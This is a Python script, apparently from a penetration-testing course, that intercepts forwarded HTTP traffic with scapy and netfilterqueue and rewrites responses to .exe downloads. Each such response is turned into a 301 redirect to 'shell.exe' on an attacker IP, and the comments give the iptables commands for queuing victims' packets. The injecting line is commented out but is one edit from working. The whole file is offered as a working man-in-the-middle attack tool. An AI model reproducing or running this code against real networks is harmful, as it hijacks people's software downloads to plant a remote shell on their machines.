#!/usr/bin/env python3
import argparse
import scapy.all as scapy
from scapy.layers import http
import netfilterqueue


# Kali Commands:
# iptables -I FORWARD -j NFQUEUE --queue-num 0  # For forwarded (remote machine) packet testing
# sudo apt install libnetfilter-queue-dev libnetfilter-queue1
# pip3 install netfilterqueue
# iptables --flush  # Once finished with packet interception


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-q", "--queue-number", dest="queue_number", help="Setup via the iptables --queue-num switch)")
    options = parser.parse_args()
    if not options.queue_number:
        parser.error("[-] Please specify a queue number, see --help for more info.")
    return options


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] .exe Request]")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file..")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.exe\n\n")
                print(scapy_packet.show())
                # packet.set_payload(bytes(modified_packet))

    packet.accept()  # Forwards packets
    # packet.drop()  # Drops packets


options = get_arguments()
print("[+] Initiating HTTP Modifier..")
print("[+] Setting up NetfilterQueue..")
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(options.queue_number), process_packet)
print("[+] Monitoring for HTTP records in queue number " + str(options.queue_number))
queue.run()

